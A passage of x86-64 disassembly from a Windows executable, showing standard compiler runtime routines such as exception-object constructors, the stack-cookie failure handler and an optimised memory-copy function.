   140001f34:	49 8b 6b 20          	mov    0x20(%r11),%rbp
   140001f38:	49 8b 73 28          	mov    0x28(%r11),%rsi
   140001f3c:	49 8b e3             	mov    %r11,%rsp
   140001f3f:	5f                   	pop    %rdi
   140001f40:	c3                   	ret
   140001f41:	cc                   	int3
   140001f42:	cc                   	int3
   140001f43:	cc                   	int3
   140001f44:	48 83 ec 28          	sub    $0x28,%rsp
   140001f48:	33 c9                	xor    %ecx,%ecx
   140001f4a:	e8 09 f2 ff ff       	call   0x140001158
   140001f4f:	33 c0                	xor    %eax,%eax
   140001f51:	48 83 c4 28          	add    $0x28,%rsp
   140001f55:	c3                   	ret
   140001f56:	ff 25 f4 f0 00 00    	jmp    *0xf0f4(%rip)        # 0x140011050
   140001f5c:	40 53                	rex push %rbx
   140001f5e:	48 83 ec 20          	sub    $0x20,%rsp
   140001f62:	48 8b d9             	mov    %rcx,%rbx
   140001f65:	e8 96 15 00 00       	call   0x140003500
   140001f6a:	48 8d 05 17 f6 00 00 	lea    0xf617(%rip),%rax        # 0x140011588
   140001f71:	48 89 03             	mov    %rax,(%rbx)
   140001f74:	48 8b c3             	mov    %rbx,%rax
   140001f77:	48 83 c4 20          	add    $0x20,%rsp
   140001f7b:	5b                   	pop    %rbx
   140001f7c:	c3                   	ret
   140001f7d:	cc                   	int3
   140001f7e:	cc                   	int3
   140001f7f:	cc                   	int3
   140001f80:	48 8d 05 01 f6 00 00 	lea    0xf601(%rip),%rax        # 0x140011588
   140001f87:	48 89 01             	mov    %rax,(%rcx)
   140001f8a:	e9 9d 15 00 00       	jmp    0x14000352c
   140001f8f:	cc                   	int3
   140001f90:	40 53                	rex push %rbx
   140001f92:	48 83 ec 40          	sub    $0x40,%rsp
   140001f96:	48 8b d9             	mov    %rcx,%rbx
   140001f99:	eb 0f                	jmp    0x140001faa
   140001f9b:	48 8b cb             	mov    %rbx,%rcx
   140001f9e:	e8 b1 16 00 00       	call   0x140003654
   140001fa3:	85 c0                	test   %eax,%eax
   140001fa5:	74 13                	je     0x140001fba
   140001fa7:	48 8b cb             	mov    %rbx,%rcx
   140001faa:	e8 7d 14 00 00       	call   0x14000342c
   140001faf:	48 85 c0             	test   %rax,%rax
   140001fb2:	74 e7                	je     0x140001f9b
   140001fb4:	48 83 c4 40          	add    $0x40,%rsp
   140001fb8:	5b                   	pop    %rbx
   140001fb9:	c3                   	ret
   140001fba:	48 8d 05 d7 f5 00 00 	lea    0xf5d7(%rip),%rax        # 0x140011598
   140001fc1:	48 8d 54 24 58       	lea    0x58(%rsp),%rdx
   140001fc6:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001fcb:	41 b8 01 00 00 00    	mov    $0x1,%r8d
   140001fd1:	48 89 44 24 58       	mov    %rax,0x58(%rsp)
   140001fd6:	e8 09 15 00 00       	call   0x1400034e4
   140001fdb:	48 8d 05 a6 f5 00 00 	lea    0xf5a6(%rip),%rax        # 0x140011588
   140001fe2:	48 8d 15 8f 5e 01 00 	lea    0x15e8f(%rip),%rdx        # 0x140017e78
   140001fe9:	48 8d 4c 24 20       	lea    0x20(%rsp),%rcx
   140001fee:	48 89 44 24 20       	mov    %rax,0x20(%rsp)
   140001ff3:	e8 98 16 00 00       	call   0x140003690
   140001ff8:	cc                   	int3
   140001ff9:	cc                   	int3
   140001ffa:	cc                   	int3
   140001ffb:	cc                   	int3
   140001ffc:	48 89 5c 24 08       	mov    %rbx,0x8(%rsp)
   140002001:	57                   	push   %rdi
   140002002:	48 83 ec 20          	sub    $0x20,%rsp
   140002006:	48 8d 05 7b f5 00 00 	lea    0xf57b(%rip),%rax        # 0x140011588
   14000200d:	8b da                	mov    %edx,%ebx
   14000200f:	48 8b f9             	mov    %rcx,%rdi
   140002012:	48 89 01             	mov    %rax,(%rcx)
   140002015:	e8 12 15 00 00       	call   0x14000352c
   14000201a:	f6 c3 01             	test   $0x1,%bl
   14000201d:	74 08                	je     0x140002027
   14000201f:	48 8b cf             	mov    %rdi,%rcx
   140002022:	e8 11 00 00 00       	call   0x140002038
   140002027:	48 8b c7             	mov    %rdi,%rax
   14000202a:	48 8b 5c 24 30       	mov    0x30(%rsp),%rbx
   14000202f:	48 83 c4 20          	add    $0x20,%rsp
   140002033:	5f                   	pop    %rdi
   140002034:	c3                   	ret
   140002035:	cc                   	int3
   140002036:	cc                   	int3
   140002037:	cc                   	int3
   140002038:	e9 57 17 00 00       	jmp    0x140003794
   14000203d:	cc                   	int3
   14000203e:	cc                   	int3
   14000203f:	cc                   	int3
   140002040:	40 53                	rex push %rbx
   140002042:	48 83 ec 20          	sub    $0x20,%rsp
   140002046:	48 8b d9             	mov    %rcx,%rbx
   140002049:	ff 15 21 f0 00 00    	call   *0xf021(%rip)        # 0x140011070
   14000204f:	b9 01 00 00 00       	mov    $0x1,%ecx
   140002054:	89 05 56 8e 01 00    	mov    %eax,0x18e56(%rip)        # 0x14001aeb0
   14000205a:	e8 75 17 00 00       	call   0x1400037d4
   14000205f:	48 8b cb             	mov    %rbx,%rcx
   140002062:	e8 99 1d 00 00       	call   0x140003e00
   140002067:	83 3d 42 8e 01 00 00 	cmpl   $0x0,0x18e42(%rip)        # 0x14001aeb0
   14000206e:	75 0a                	jne    0x14000207a
   140002070:	b9 01 00 00 00       	mov    $0x1,%ecx
   140002075:	e8 5a 17 00 00       	call   0x1400037d4
   14000207a:	b9 09 04 00 c0       	mov    $0xc0000409,%ecx
   14000207f:	48 83 c4 20          	add    $0x20,%rsp
   140002083:	5b                   	pop    %rbx
   140002084:	e9 57 1d 00 00       	jmp    0x140003de0
   140002089:	cc                   	int3
   14000208a:	cc                   	int3
   14000208b:	cc                   	int3
   14000208c:	48 89 4c 24 08       	mov    %rcx,0x8(%rsp)
   140002091:	48 83 ec 38          	sub    $0x38,%rsp
   140002095:	b9 17 00 00 00       	mov    $0x17,%ecx
   14000209a:	e8 2d e4 00 00       	call   0x1400104cc
   14000209f:	85 c0                	test   %eax,%eax
   1400020a1:	74 07                	je     0x1400020aa
   1400020a3:	b9 02 00 00 00       	mov    $0x2,%ecx
   1400020a8:	cd 29                	int    $0x29
   1400020aa:	48 8d 0d 2f 89 01 00 	lea    0x1892f(%rip),%rcx        # 0x14001a9e0
   1400020b1:	e8 96 17 00 00       	call   0x14000384c
   1400020b6:	48 8b 44 24 38       	mov    0x38(%rsp),%rax
   1400020bb:	48 89 05 16 8a 01 00 	mov    %rax,0x18a16(%rip)        # 0x14001aad8
   1400020c2:	48 8d 44 24 38       	lea    0x38(%rsp),%rax
   1400020c7:	48 83 c0 08          	add    $0x8,%rax
   1400020cb:	48 89 05 a6 89 01 00 	mov    %rax,0x189a6(%rip)        # 0x14001aa78
   1400020d2:	48 8b 05 ff 89 01 00 	mov    0x189ff(%rip),%rax        # 0x14001aad8
   1400020d9:	48 89 05 70 88 01 00 	mov    %rax,0x18870(%rip)        # 0x14001a950
   1400020e0:	48 8b 44 24 40       	mov    0x40(%rsp),%rax
   1400020e5:	48 89 05 74 89 01 00 	mov    %rax,0x18974(%rip)        # 0x14001aa60
   1400020ec:	c7 05 4a 88 01 00 09 	movl   $0xc0000409,0x1884a(%rip)        # 0x14001a940
   1400020f3:	04 00 c0 
   1400020f6:	c7 05 44 88 01 00 01 	movl   $0x1,0x18844(%rip)        # 0x14001a944
   1400020fd:	00 00 00 
   140002100:	c7 05 4e 88 01 00 01 	movl   $0x1,0x1884e(%rip)        # 0x14001a958
   140002107:	00 00 00 
   14000210a:	b8 08 00 00 00       	mov    $0x8,%eax
   14000210f:	48 6b c0 00          	imul   $0x0,%rax,%rax
   140002113:	48 8d 0d 46 88 01 00 	lea    0x18846(%rip),%rcx        # 0x14001a960
   14000211a:	48 c7 04 01 02 00 00 	movq   $0x2,(%rcx,%rax,1)
   140002121:	00 
   140002122:	b8 08 00 00 00       	mov    $0x8,%eax
   140002127:	48 6b c0 00          	imul   $0x0,%rax,%rax
   14000212b:	48 8b 0d ce 6e 01 00 	mov    0x16ece(%rip),%rcx        # 0x140019000
   140002132:	48 89 4c 04 20       	mov    %rcx,0x20(%rsp,%rax,1)
   140002137:	b8 08 00 00 00       	mov    $0x8,%eax
   14000213c:	48 6b c0 01          	imul   $0x1,%rax,%rax
   140002140:	48 8b 0d c1 6e 01 00 	mov    0x16ec1(%rip),%rcx        # 0x140019008
   140002147:	48 89 4c 04 20       	mov    %rcx,0x20(%rsp,%rax,1)
   14000214c:	48 8d 0d 55 f4 00 00 	lea    0xf455(%rip),%rcx        # 0x1400115a8
   140002153:	e8 e8 fe ff ff       	call   0x140002040
   140002158:	48 83 c4 38          	add    $0x38,%rsp
   14000215c:	c3                   	ret
   14000215d:	cc                   	int3
   14000215e:	cc                   	int3
   14000215f:	cc                   	int3
   140002160:	48 83 ec 28          	sub    $0x28,%rsp
   140002164:	b9 08 00 00 00       	mov    $0x8,%ecx
   140002169:	e8 06 00 00 00       	call   0x140002174
   14000216e:	48 83 c4 28          	add    $0x28,%rsp
   140002172:	c3                   	ret
   140002173:	cc                   	int3
   140002174:	89 4c 24 08          	mov    %ecx,0x8(%rsp)
   140002178:	48 83 ec 28          	sub    $0x28,%rsp
   14000217c:	b9 17 00 00 00       	mov    $0x17,%ecx
   140002181:	e8 46 e3 00 00       	call   0x1400104cc
   140002186:	85 c0                	test   %eax,%eax
   140002188:	74 08                	je     0x140002192
   14000218a:	8b 44 24 30          	mov    0x30(%rsp),%eax
   14000218e:	8b c8                	mov    %eax,%ecx
   140002190:	cd 29                	int    $0x29
   140002192:	48 8d 0d 47 88 01 00 	lea    0x18847(%rip),%rcx        # 0x14001a9e0
   140002199:	e8 3e 16 00 00       	call   0x1400037dc
   14000219e:	48 8b 44 24 28       	mov    0x28(%rsp),%rax
   1400021a3:	48 89 05 2e 89 01 00 	mov    %rax,0x1892e(%rip)        # 0x14001aad8
   1400021aa:	48 8d 44 24 28       	lea    0x28(%rsp),%rax
   1400021af:	48 83 c0 08          	add    $0x8,%rax
   1400021b3:	48 89 05 be 88 01 00 	mov    %rax,0x188be(%rip)        # 0x14001aa78
   1400021ba:	48 8b 05 17 89 01 00 	mov    0x18917(%rip),%rax        # 0x14001aad8
   1400021c1:	48 89 05 88 87 01 00 	mov    %rax,0x18788(%rip)        # 0x14001a950
   1400021c8:	c7 05 6e 87 01 00 09 	movl   $0xc0000409,0x1876e(%rip)        # 0x14001a940
   1400021cf:	04 00 c0 
   1400021d2:	c7 05 68 87 01 00 01 	movl   $0x1,0x18768(%rip)        # 0x14001a944
   1400021d9:	00 00 00 
   1400021dc:	c7 05 72 87 01 00 01 	movl   $0x1,0x18772(%rip)        # 0x14001a958
   1400021e3:	00 00 00 
   1400021e6:	b8 08 00 00 00       	mov    $0x8,%eax
   1400021eb:	48 6b c0 00          	imul   $0x0,%rax,%rax
   1400021ef:	48 8d 0d 6a 87 01 00 	lea    0x1876a(%rip),%rcx        # 0x14001a960
   1400021f6:	8b 54 24 30          	mov    0x30(%rsp),%edx
   1400021fa:	48 89 14 01          	mov    %rdx,(%rcx,%rax,1)
   1400021fe:	48 8d 0d a3 f3 00 00 	lea    0xf3a3(%rip),%rcx        # 0x1400115a8
   140002205:	e8 36 fe ff ff       	call   0x140002040
   14000220a:	48 83 c4 28          	add    $0x28,%rsp
   14000220e:	c3                   	ret
   14000220f:	cc                   	int3
   140002210:	cc                   	int3
   140002211:	cc                   	int3
   140002212:	cc                   	int3
   140002213:	cc                   	int3
   140002214:	cc                   	int3
   140002215:	cc                   	int3
   140002216:	66 66 0f 1f 84 00 00 	data16 nopw 0x0(%rax,%rax,1)
   14000221d:	00 00 00 
   140002220:	4c 8b d9             	mov    %rcx,%r11
   140002223:	4c 8b d2             	mov    %rdx,%r10
   140002226:	49 83 f8 10          	cmp    $0x10,%r8
   14000222a:	0f 86 b9 00 00 00    	jbe    0x1400022e9
   140002230:	48 2b d1             	sub    %rcx,%rdx
   140002233:	73 0f                	jae    0x140002244
   140002235:	49 8b c2             	mov    %r10,%rax
   140002238:	49 03 c0             	add    %r8,%rax
   14000223b:	48 3b c8             	cmp    %rax,%rcx
   14000223e:	0f 8c 96 03 00 00    	jl     0x1400025da
   140002244:	0f ba 25 9c 8c 01 00 	btl    $0x1,0x18c9c(%rip)        # 0x14001aee8
   14000224b:	01 
   14000224c:	73 13                	jae    0x140002261
   14000224e:	57                   	push   %rdi
   14000224f:	56                   	push   %rsi
   140002250:	48 8b f9             	mov    %rcx,%rdi
   140002253:	49 8b f2             	mov    %r10,%rsi
   140002256:	49 8b c8             	mov    %r8,%rcx
   140002259:	f3 a4                	rep movsb (%rsi),(%rdi)
   14000225b:	5e                   	pop    %rsi
   14000225c:	5f                   	pop    %rdi
   14000225d:	49 8b c3             	mov    %r11,%rax
   140002260:	c3                   	ret
   140002261:	0f ba 25 7f 8c 01 00 	btl    $0x2,0x18c7f(%rip)        # 0x14001aee8
   140002268:	02 
   140002269:	0f 82 56 02 00 00    	jb     0x1400024c5
   14000226f:	f6 c1 07             	test   $0x7,%cl
   140002272:	74 36                	je     0x1400022aa
   140002274:	f6 c1 01             	test   $0x1,%cl
   140002277:	74 0b                	je     0x140002284
   140002279:	8a 04 0a             	mov    (%rdx,%rcx,1),%al
   14000227c:	49 ff c8             	dec    %r8
   14000227f:	88 01                	mov    %al,(%rcx)
   140002281:	48 ff c1             	inc    %rcx
   140002284:	f6 c1 02             	test   $0x2,%cl
   140002287:	74 0f                	je     0x140002298
   140002289:	66 8b 04 0a          	mov    (%rdx,%rcx,1),%ax
   14000228d:	49 83 e8 02          	sub    $0x2,%r8
   140002291:	66 89 01             	mov    %ax,(%rcx)
   140002294:	48 83 c1 02          	add    $0x2,%rcx
   140002298:	f6 c1 04             	test   $0x4,%cl
   14000229b:	74 0d                	je     0x1400022aa
   14000229d:	8b 04 0a             	mov    (%rdx,%rcx,1),%eax
   1400022a0:	49 83 e8 04          	sub    $0x4,%r8
   1400022a4:	89 01                	mov    %eax,(%rcx)
   1400022a6:	48 83 c1 04          	add    $0x4,%rcx
   1400022aa:	4d 8b c8             	mov    %r8,%r9
   1400022ad:	49 c1 e9 05          	shr    $0x5,%r9
   1400022b1:	0f 85 d9 01 00 00    	jne    0x140002490
   1400022b7:	4d 8b c8             	mov    %r8,%r9
   1400022ba:	49 c1 e9 03          	shr    $0x3,%r9
   1400022be:	74 14                	je     0x1400022d4
   1400022c0:	48 8b 04 0a          	mov    (%rdx,%rcx,1),%rax
   1400022c4:	48 89 01             	mov    %rax,(%rcx)
   1400022c7:	48 83 c1 08          	add    $0x8,%rcx
   1400022cb:	49 ff c9             	dec    %r9
   1400022ce:	75 f0                	jne    0x1400022c0
   1400022d0:	49 83 e0 07          	and    $0x7,%r8
   1400022d4:	4d 85 c0             	test   %r8,%r8
   1400022d7:	75 07                	jne    0x1400022e0
   1400022d9:	49 8b c3             	mov    %r11,%rax
   1400022dc:	c3                   	ret
   1400022dd:	0f 1f 00             	nopl   (%rax)
   1400022e0:	48 8d 14 0a          	lea    (%rdx,%rcx,1),%rdx
   1400022e4:	4c 8b d1             	mov    %rcx,%r10
   1400022e7:	eb 03                	jmp    0x1400022ec
   1400022e9:	4d 8b d3             	mov    %r11,%r10
   1400022ec:	4c 8d 0d 0d dd ff ff 	lea    -0x22f3(%rip),%r9        # 0x140000000
   1400022f3:	43 8b 84 81 00 23 00 	mov    0x2300(%r9,%r8,4),%eax
   1400022fa:	00 
   1400022fb:	49 03 c1             	add    %r9,%rax
   1400022fe:	ff e0                	jmp    *%rax
   140002300:	44 23 00             	and    (%rax),%r8d
   140002303:	00 48 23             	add    %cl,0x23(%rax)
   140002306:	00 00                	add    %al,(%rax)
   140002308:	53                   	push   %rbx
   140002309:	23 00                	and    (%rax),%eax
   14000230b:	00 5f 23             	add    %bl,0x23(%rdi)
   14000230e:	00 00                	add    %al,(%rax)
   140002310:	74 23                	je     0x140002335
   140002312:	00 00                	add    %al,(%rax)
   140002314:	7d 23                	jge    0x140002339
   140002316:	00 00                	add    %al,(%rax)
   140002318:	8f                   	(bad)
   140002319:	23 00                	and    (%rax),%eax
   14000231b:	00 a2 23 00 00 be    	add    %ah,-0x41ffffdd(%rdx)
   140002321:	23 00                	and    (%rax),%eax
   140002323:	00 c8                	add    %cl,%al
   140002325:	23 00                	and    (%rax),%eax
   140002327:	00 db                	add    %bl,%bl
   140002329:	23 00                	and    (%rax),%eax
   14000232b:	00 ef                	add    %ch,%bh
   14000232d:	23 00                	and    (%rax),%eax
   14000232f:	00 0c 24             	add    %cl,(%rsp)
   140002332:	00 00                	add    %al,(%rax)
   140002334:	1d 24 00 00 37       	sbb    $0x37000024,%eax
   140002339:	24 00                	and    $0x0,%al
   14000233b:	00 52 24             	add    %dl,0x24(%rdx)
   14000233e:	00 00                	add    %al,(%rax)
   140002340:	76 24                	jbe    0x140002366
   140002342:	00 00                	add    %al,(%rax)
   140002344:	49 8b c3             	mov    %r11,%rax
   140002347:	c3                   	ret
   140002348:	48 0f b6 02          	movzbq (%rdx),%rax
   14000234c:	41 88 02             	mov    %al,(%r10)
   14000234f:	49 8b c3             	mov    %r11,%rax
   140002352:	c3                   	ret
   140002353:	48 0f b7 02          	movzwq (%rdx),%rax
   140002357:	66 41 89 02          	mov    %ax,(%r10)
   14000235b:	49 8b c3             	mov    %r11,%rax
   14000235e:	c3                   	ret
   14000235f:	48 0f b6 02          	movzbq (%rdx),%rax
   140002363:	48 0f b7 4a 01       	movzwq 0x1(%rdx),%rcx
   140002368:	41 88 02             	mov    %al,(%r10)
   14000236b:	66 41 89 4a 01       	mov    %cx,0x1(%r10)
   140002370:	49 8b c3             	mov    %r11,%rax
   140002373:	c3                   	ret
   140002374:	8b 02                	mov    (%rdx),%eax
   140002376:	41 89 02             	mov    %eax,(%r10)
   140002379:	49 8b c3             	mov    %r11,%rax
   14000237c:	c3                   	ret
   14000237d:	48 0f b6 02          	movzbq (%rdx),%rax
   140002381:	8b 4a 01             	mov    0x1(%rdx),%ecx
   140002384:	41 88 02             	mov    %al,(%r10)
   140002387:	41 89 4a 01          	mov    %ecx,0x1(%r10)
   14000238b:	49 8b c3             	mov    %r11,%rax
   14000238e:	c3                   	ret
   14000238f:	48 0f b7 02          	movzwq (%rdx),%rax
   140002393:	8b 4a 02             	mov    0x2(%rdx),%ecx
   140002396:	66 41 89 02          	mov    %ax,(%r10)
   14000239a:	41 89 4a 02          	mov    %ecx,0x2(%r10)
   14000239e:	49 8b c3             	mov    %r11,%rax
   1400023a1:	c3                   	ret
   1400023a2:	48 0f b6 02          	movzbq (%rdx),%rax
   1400023a6:	48 0f b7 4a 01       	movzwq 0x1(%rdx),%rcx
   1400023ab:	8b 52 03             	mov    0x3(%rdx),%edx
   1400023ae:	41 88 02             	mov    %al,(%r10)
   1400023b1:	66 41 89 4a 01       	mov    %cx,0x1(%r10)
   1400023b6:	41 89 52 03          	mov    %edx,0x3(%r10)
   1400023ba:	49 8b c3             	mov    %r11,%rax
   1400023bd:	c3                   	ret
   1400023be:	48 8b 02             	mov    (%rdx),%rax
   1400023c1:	49 89 02             	mov    %rax,(%r10)
   1400023c4:	49 8b c3             	mov    %r11,%rax
   1400023c7:	c3                   	ret
   1400023c8:	48 0f b6 02          	movzbq (%rdx),%rax
   1400023cc:	48 8b 4a 01          	mov    0x1(%rdx),%rcx
   1400023d0:	41 88 02             	mov    %al,(%r10)
   1400023d3:	49 89 4a 01          	mov    %rcx,0x1(%r10)
   1400023d7:	49 8b c3             	mov    %r11,%rax
   1400023da:	c3                   	ret
   1400023db:	48 0f b7 02          	movzwq (%rdx),%rax
   1400023df:	48 8b 4a 02          	mov    0x2(%rdx),%rcx
   1400023e3:	66 41 89 02          	mov    %ax,(%r10)
   1400023e7:	49 89 4a 02          	mov    %rcx,0x2(%r10)
   1400023eb:	49 8b c3             	mov    %r11,%rax
   1400023ee:	c3                   	ret
   1400023ef:	48 0f b6 02          	movzbq (%rdx),%rax
   1400023f3:	48 0f b7 4a 01       	movzwq 0x1(%rdx),%rcx
   1400023f8:	48 8b 52 03          	mov    0x3(%rdx),%rdx
   1400023fc:	41 88 02             	mov    %al,(%r10)
   1400023ff:	66 41 89 4a 01       	mov    %cx,0x1(%r10)
   140002404:	49 89 52 03          	mov    %rdx,0x3(%r10)
   140002408:	49 8b c3             	mov    %r11,%rax
   14000240b:	c3                   	ret
   14000240c:	8b 02                	mov    (%rdx),%eax
   14000240e:	48 8b 4a 04          	mov    0x4(%rdx),%rcx
   140002412:	41 89 02             	mov    %eax,(%r10)
   140002415:	49 89 4a 04          	mov    %rcx,0x4(%r10)
   140002419:	49 8b c3             	mov    %r11,%rax
   14000241c:	c3                   	ret
   14000241d:	48 0f b6 02          	movzbq (%rdx),%rax
   140002421:	8b 4a 01             	mov    0x1(%rdx),%ecx
   140002424:	48 8b 52 05          	mov    0x5(%rdx),%rdx
   140002428:	41 88 02             	mov    %al,(%r10)
   14000242b:	41 89 4a 01          	mov    %ecx,0x1(%r10)
   14000242f:	49 89 52 05          	mov    %rdx,0x5(%r10)
   140002433:	49 8b c3             	mov    %r11,%rax
   140002436:	c3                   	ret
   140002437:	48 0f b7 02          	movzwq (%rdx),%rax
   14000243b:	8b 4a 02             	mov    0x2(%rdx),%ecx
   14000243e:	48 8b 52 06          	mov    0x6(%rdx),%rdx
   140002442:	66 41 89 02          	mov    %ax,(%r10)
   140002446:	41 89 4a 02          	mov    %ecx,0x2(%r10)
   14000244a:	49 89 52 06          	mov    %rdx,0x6(%r10)
   14000244e:	49 8b c3             	mov    %r11,%rax
   140002451:	c3                   	ret
   140002452:	4c 0f b6 02          	movzbq (%rdx),%r8
   140002456:	48 0f b7 42 01       	movzwq 0x1(%rdx),%rax
   14000245b:	8b 4a 03             	mov    0x3(%rdx),%ecx
   14000245e:	48 8b 52 07          	mov    0x7(%rdx),%rdx
   140002462:	45 88 02             	mov    %r8b,(%r10)
   140002465:	66 41 89 42 01       	mov    %ax,0x1(%r10)
   14000246a:	41 89 4a 03          	mov    %ecx,0x3(%r10)
   14000246e:	49 89 52 07          	mov    %rdx,0x7(%r10)
   140002472:	49 8b c3             	mov    %r11,%rax
   140002475:	c3                   	ret
   140002476:	f3 0f 6f 02          	movdqu (%rdx),%xmm0
   14000247a:	f3 41 0f 7f 02       	movdqu %xmm0,(%r10)
   14000247f:	49 8b c3             	mov    %r11,%rax
   140002482:	c3                   	ret
   140002483:	66 66 66 66 66 0f 1f 	data16 data16 data16 data16 nopw 0x0(%rax,%rax,1)
   14000248a:	84 00 00 00 00 00 
   140002490:	48 8b 04 0a          	mov    (%rdx,%rcx,1),%rax
   140002494:	4c 8b 54 0a 08       	mov    0x8(%rdx,%rcx,1),%r10
   140002499:	48 83 c1 20          	add    $0x20,%rcx
   14000249d:	48 89 41 e0          	mov    %rax,-0x20(%rcx)
   1400024a1:	4c 89 51 e8          	mov    %r10,-0x18(%rcx)
   1400024a5:	48 8b 44 0a f0       	mov    -0x10(%rdx,%rcx,1),%rax
   1400024aa:	4c 8b 54 0a f8       	mov    -0x8(%rdx,%rcx,1),%r10
   1400024af:	49 ff c9             	dec    %r9
   1400024b2:	48 89 41 f0          	mov    %rax,-0x10(%rcx)
   1400024b6:	4c 89 51 f8          	mov    %r10,-0x8(%rcx)
   1400024ba:	75 d4                	jne    0x140002490
   1400024bc:	49 83 e0 1f          	and    $0x1f,%r8
   1400024c0:	e9 f2 fd ff ff       	jmp    0x1400022b7
   1400024c5:	49 83 f8 20          	cmp    $0x20,%r8
   1400024c9:	0f 86 e1 00 00 00    	jbe    0x1400025b0
   1400024cf:	f6 c1 0f             	test   $0xf,%cl
   1400024d2:	75 0e                	jne    0x1400024e2
   1400024d4:	0f 10 04 0a          	movups (%rdx,%rcx,1),%xmm0
   1400024d8:	48 83 c1 10          	add    $0x10,%rcx
   1400024dc:	49 83 e8 10          	sub    $0x10,%r8
   1400024e0:	eb 1d                	jmp    0x1400024ff
   1400024e2:	0f 10 0c 0a          	movups (%rdx,%rcx,1),%xmm1
   1400024e6:	48 83 c1 20          	add    $0x20,%rcx
   1400024ea:	80 e1 f0             	and    $0xf0,%cl
   1400024ed:	0f 10 44 0a f0       	movups -0x10(%rdx,%rcx,1),%xmm0
   1400024f2:	41 0f 11 0b          	movups %xmm1,(%r11)
   1400024f6:	48 8b c1             	mov    %rcx,%rax
   1400024f9:	49 2b c3             	sub    %r11,%rax
   1400024fc:	4c 2b c0             	sub    %rax,%r8
   1400024ff:	4d 8b c8             	mov    %r8,%r9
   140002502:	49 c1 e9 07          	shr    $0x7,%r9
   140002506:	74 66                	je     0x14000256e
   140002508:	0f 29 41 f0          	movaps %xmm0,-0x10(%rcx)
   14000250c:	eb 0a                	jmp    0x140002518
   14000250e:	66 90                	xchg   %ax,%ax
   140002510:	0f 29 41 e0          	movaps %xmm0,-0x20(%rcx)
   140002514:	0f 29 49 f0          	movaps %xmm1,-0x10(%rcx)
   140002518:	0f 10 04 0a          	movups (%rdx,%rcx,1),%xmm0
   14000251c:	0f 10 4c 0a 10       	movups 0x10(%rdx,%rcx,1),%xmm1
   140002521:	48 81 c1 80 00 00 00 	add    $0x80,%rcx
   140002528:	0f 29 41 80          	movaps %xmm0,-0x80(%rcx)
   14000252c:	0f 29 49 90          	movaps %xmm1,-0x70(%rcx)
   140002530:	0f 10 44 0a a0       	movups -0x60(%rdx,%rcx,1),%xmm0
   140002535:	0f 10 4c 0a b0       	movups -0x50(%rdx,%rcx,1),%xmm1
   14000253a:	49 ff c9             	dec    %r9
   14000253d:	0f 29 41 a0          	movaps %xmm0,-0x60(%rcx)
   140002541:	0f 29 49 b0          	movaps %xmm1,-0x50(%rcx)
   140002545:	0f 10 44 0a c0       	movups -0x40(%rdx,%rcx,1),%xmm0
   14000254a:	0f 10 4c 0a d0       	movups -0x30(%rdx,%rcx,1),%xmm1
   14000254f:	0f 29 41 c0          	movaps %xmm0,-0x40(%rcx)
   140002553:	0f 29 49 d0          	movaps %xmm1,-0x30(%rcx)
   140002557:	0f 10 44 0a e0       	movups -0x20(%rdx,%rcx,1),%xmm0
   14000255c:	0f 10 4c 0a f0       	movups -0x10(%rdx,%rcx,1),%xmm1
   140002561:	75 ad                	jne    0x140002510
   140002563:	0f 29 41 e0          	movaps %xmm0,-0x20(%rcx)
   140002567:	49 83 e0 7f          	and    $0x7f,%r8
   14000256b:	0f 28 c1             	movaps %xmm1,%xmm0
   14000256e:	4d 8b c8             	mov    %r8,%r9
   140002571:	49 c1 e9 04          	shr    $0x4,%r9
   140002575:	74 1a                	je     0x140002591
   140002577:	66 0f 1f 84 00 00 00 	nopw   0x0(%rax,%rax,1)
   14000257e:	00 00 
   140002580:	0f 29 41 f0          	movaps %xmm0,-0x10(%rcx)
   140002584:	0f 10 04 0a          	movups (%rdx,%rcx,1),%xmm0
   140002588:	48 83 c1 10          	add    $0x10,%rcx
   14000258c:	49 ff c9             	dec    %r9
   14000258f:	75 ef                	jne    0x140002580
   140002591:	49 83 e0 0f          	and    $0xf,%r8
   140002595:	74 0d                	je     0x1400025a4
   140002597:	49 8d 04 08          	lea    (%r8,%rcx,1),%rax
   14000259b:	0f 10 4c 02 f0       	movups -0x10(%rdx,%rax,1),%xmm1
   1400025a0:	0f 11 48 f0          	movups %xmm1,-0x10(%rax)
   1400025a4:	0f 29 41 f0          	movaps %xmm0,-0x10(%rcx)
   1400025a8:	49 8b c3             	mov    %r11,%rax
   1400025ab:	c3                   	ret
   1400025ac:	0f 1f 40 00          	nopl   0x0(%rax)
   1400025b0:	41 0f 10 02          	movups (%r10),%xmm0
   1400025b4:	49 8d 4c 08 f0       	lea    -0x10(%r8,%rcx,1),%rcx
   1400025b9:	0f 10 0c 0a          	movups (%rdx,%rcx,1),%xmm1
   1400025bd:	41 0f 11 03          	movups %xmm0,(%r11)
   1400025c1:	0f 11 09             	movups %xmm1,(%rcx)
   1400025c4:	49 8b c3             	mov    %r11,%rax
   1400025c7:	c3                   	ret
   1400025c8:	0f 1f 84 00 00 00 00 	nopl   0x0(%rax,%rax,1)
   1400025cf:	00 
   1400025d0:	66 66 66 90          	data16 data16 xchg %ax,%ax
   1400025d4:	66 66 66 90          	data16 data16 xchg %ax,%ax
   1400025d8:	66 90                	xchg   %ax,%ax
   1400025da:	0f ba 25 06 89 01 00 	btl    $0x2,0x18906(%rip)        # 0x14001aee8
   1400025e1:	02 
   1400025e2:	0f 82 b9 00 00 00    	jb     0x1400026a1
   1400025e8:	49 03 c8             	add    %r8,%rcx
   1400025eb:	f6 c1 07             	test   $0x7,%cl
   1400025ee:	74 36                	je     0x140002626
   1400025f0:	f6 c1 01             	test   $0x1,%cl
   1400025f3:	74 0b                	je     0x140002600
   1400025f5:	48 ff c9             	dec    %rcx
   1400025f8:	8a 04 0a             	mov    (%rdx,%rcx,1),%al
   1400025fb:	49 ff c8             	dec    %r8
   1400025fe:	88 01                	mov    %al,(%rcx)
   140002600:	f6 c1 02             	test   $0x2,%cl
   140002603:	74 0f                	je     0x140002614
   140002605:	48 83 e9 02          	sub    $0x2,%rcx
   140002609:	66 8b 04 0a          	mov    (%rdx,%rcx,1),%ax
   14000260d:	49 83 e8 02          	sub    $0x2,%r8
   140002611:	66 89 01             	mov    %ax,(%rcx)
   140002614:	f6 c1 04             	test   $0x4,%cl
   140002617:	74 0d                	je     0x140002626
   140002619:	48 83 e9 04          	sub    $0x4,%rcx
   14000261d:	8b 04 0a             	mov    (%rdx,%rcx,1),%eax
   140002620:	49 83 e8 04          	sub    $0x4,%r8
   140002624:	89 01                	mov    %eax,(%rcx)
   140002626:	4d 8b c8             	mov    %r8,%r9
   140002629:	49 c1 e9 05          	shr    $0x5,%r9
   14000262d:	75 41                	jne    0x140002670
